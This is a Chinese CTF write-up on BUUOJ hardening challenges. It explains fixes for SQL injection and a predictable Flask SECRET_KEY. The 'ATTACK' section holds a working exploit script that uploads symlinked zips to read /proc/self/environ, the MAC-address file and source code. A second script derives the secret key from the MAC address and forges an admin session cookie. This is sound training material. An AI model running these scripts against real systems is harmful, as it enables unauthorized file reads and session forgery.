---
title: "buuoj加固题 Wp"
slug: "buuoj-fixchalls-wp"
description: "合集合集，长期更新~"
date: 2021-11-07T08:57:29+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

buuoj新上了加固题这个分类，也就是线下awdp中fix的部分，只要将靶机中存在的漏洞修复好并通过check的检测即可拿到flag；有一说一，比单纯attack拿flag会简单很多（适合我这种沸物web

下面的wp会先说纯修复角度，再串一下整体的知识点；因为自己水平有限，想尽可能说的清楚一些就会比较啰嗦，见谅QAQ

## Ezsql

### FIX

![image-20211107083450780](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107083450780.png)

200行，太典了，对传入的参数完全没有检测，是个筛子；用预处理的方式修，又可以分为两种形式

### mysql预处理

![image-20211107083655664](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107083655664.png)

其中201行的`ss`指的是绑定SQL参数的类型为string，这一项必不可少而且必须与后面的参数一一对应

### PDO预处理

![image-20211107084309239](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107084309239.png)

PDO预处理属于是通防了，能有效地应对sqli特别是堆叠注入，208行的设置项意为禁用模拟预处理

## [CISCN2021 总决赛]babypython

### FIX

ssh连上后看下目录结构

![image-20211106212456961](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212456961.png)

查看/app/y0u_found_it/y0u_found_it_main.py

![image-20211106212556547](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212556547.png)

11行这不是典中典了？读mac地址就打通了，所以我们直接把SECRET_KEY改为一个又长又乱的随机字符串即可，可以使用[uuid/guid生成器](uuid/guid生成器)来生成

![image-20211106210732859](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106210732859.png)

> ————碎碎念：这里修复的时候可能看脸？我在几天前试的时候用的一模一样的方法，但是怎么都不能过check，今天试了一次就可以了，但是在写wp的时候再复盘就又不可以了……emmm 可能还是哪里的细节出了错但是我没有注意到？给我整不会了属于是

### 关于本题

是个原题，还是个有了包浆的原题，参见->**[[HCTF 2018]Hideandseek](https://buuoj.cn/challenges#[HCTF%202018]Hideandseek)**  |  **[[SWPU2019]Web3](https://buuoj.cn/challenges#[SWPU2019]Web3)**，做过的就知道这他妈真的就一模一样hhhhhhhh

考点在于linux软链接+uuid+flask-session伪造，后者还经常单独出题，比如 **[[CISCN2019 华东南赛区]Web4](https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA]Web4)**，都快烤烂了

### 考点一 · uuid&SECRET_KEY

SECRET_KEY通过uuid+伪随机数的方式生成，这个考点可以参考 **[[CISCN2019 华东南赛区]Web4](https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA]Web4)**，其中app.py是这样写的

![image-20211106212834438](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212834438.png)

`uuid.getnode()`会以48位二进制长度的正整数形式返回mac地址，linux下mac地址的位置在`/sys/class/net/eth0/address`，读出mac地址后我们也来生成一波伪随机数

![image-20210707204313712](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210707204313712.png)

之后通过flask-session-cookie-manager一把梭即可伪造session值

![image-20210707204240633](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210707204240633.png)

————另外，通常访问不存在目录时SECRET_KEY会出现在请求头中

### 考点二 · linux软链接文件读取&zip压缩包

ln -s是linux中的软链接命令，我们可以制作对应文件的绝对路径的软链接来读文件；当不知道flask工作目录可以使用`/proc/self/cwd`来指向当前进程的目录

```bash
ln -s /proc/self/cwd/flag/flag/.jpg qwe
```

或者通过`/proc/self/environ`文件里包含进程的环境变量，可以从中获取flask的绝对路径，再制作软链接（关于/proc的更多信息可以参见->[/proc目录的妙用](/proc目录的妙用)  |  [LFItoRCE利用总结](https://bbs.zkaq.cn/t/3639.html)，题->[[网鼎杯 2020 白虎组]PicDown](https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%99%BD%E8%99%8E%E7%BB%84]PicDown)

```bash
ln -s /proc/self/environ qwe
```

而对于目录内文件的列举也是有方法的，参见->[34C3 CTF Web题 extract0r Writeup](https://blog.csdn.net/keyball123/article/details/105169946)

甚至也可以写入shell，参见->[[深育杯 2021]Zipzip](https://mp.weixin.qq.com/s/NvItuko9ZAUNTJaSzBpNKw)

制作好的软链接通过zip打包

```bash
zip -ry qwe.zip qwe
```

更多题目中的应用可以参见->[记录一道题的多种解法](http://redteam.today/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/)

关于这个漏洞的实际应用可以参见->[GitLab 任意文件读取漏洞 (CVE-2016-9086) 和任意用户 token 泄露漏洞](https://paper.seebug.org/104/)

### *ATTACK

exp.py - 1 生成软链接&zip&自动上传

```python
import requests
import os
import sys

url = 'http://0a716e50-1cf2-4cd8-a00f-b70d9987ed64.node3.buuoj.cn/upload'

def makezip():
    os.system('ln -s '+sys.argv[1]+' exp')
    # os.system('zip --symlinks exp.zip exp')
    os.system('zip -ry exp.zip exp')
makezip()

files = {'the_file':open('./exp.zip', 'rb')}
def exploit():
    res = requests.post(url, files=files)
    print(res.text)
exploit()

os.system('rm -rf exp')
os.system('rm -rf exp.zip')
```

```bash
python3 exp.py /proc/self/environ
python3 exp.py /app/y0u_found_it.ini
python3 exp.py /app/y0u_found_it/y0u_found_it_main.py
python3 exp.py /sys/class/net/eth0/address
```

![image-20211106234837193](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106234837193.png)

exp.py - 2 根据mac地址生成伪随机数

```python
import uuid
import random

mac = "02:42:0a:00:cb:06"
temp = mac.split(':')
temp = [int(i,16) for i in temp]
temp = [bin(i).replace('0b','').zfill(8) for i in temp]
temp = ''.join(temp)
mac = int(temp,2)
random.seed(mac)
result = str(random.random()*100)
print(result)
# 36.014406163923596
```

```bash
python3 flask_session_cookie_manager3.py decode -c 'eyJ1c2VybmFtZSI6Imd1ZXN0In0.FGg0EA.rHjESo_p6RCP0eiosSFmF3xEmRc'
python3 flask_session_cookie_manager3.py encode -s '36.014406163923596'  -t "{u'username': u'admin'}"
```

![image-20211106235751916](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106235751916.png)

翻回头看源码，好家伙这里有内鬼

![image-20211106235832895](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106235832895.png)

![image-20211107075450043](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107075450043.png)

返回的并不是真正的flag，而是secret.secret中的内容no flah

![image-20211107075326929](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107075326929.png)

67行这里会对unzip打开的文件进行检查，只要含有flag字样就会重定向至/?error=1

————这里我感觉原题应该secret.py中的`secret=`直接就能读出来flag，想了好久，再绕一层flag.txt的话我是想不出来什么bypass的方法了，我倾向于是布置环境的时候没有设置这一点（

## ***[CISCN2021 总决赛]easy_python

![image-20211106212057524](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212057524.png)

不知道是我的网络问题还是什么未知的bug……check之后就会宕机，只能重新下发靶机

## ***[CISCN2021 总决赛]ezj4va

https://juejin.cn/post/6997314123918737422

还不会java 先空着TAT

